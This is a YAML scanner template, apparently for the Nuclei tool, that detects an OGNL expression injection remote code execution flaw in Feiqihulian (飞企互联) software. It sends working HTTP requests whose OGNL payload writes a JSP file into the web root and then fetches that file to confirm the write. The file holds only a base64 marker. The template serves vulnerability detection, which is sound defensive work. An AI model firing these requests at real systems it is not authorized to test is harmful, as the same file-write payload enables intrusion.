id: feiqihulian-common_sort_tree-rce

info:
  name: 飞企互联Ognl表达式注入导致RCE漏洞
  author: feiqihulian
  severity: high
  tags: feiqihulian

http:
  - raw:
      - |
        POST /common/common_sort_tree.jsp;.js HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: close
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded

        rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../server/default/deploy/fe.war/d32d5s.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("dzdnMHNobzFhNW1p"))%25}

      - |
        POST /common/common_sort_tree.jsp;.js HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: close
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded

        rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/d32d5s.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("dzdnMHNobzFhNW1p"))%25}

      - |+
        GET /d32d5s.jsp; HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body_3
        words:
          - 'w7g0sho1a5mi'
    matchers-condition: and
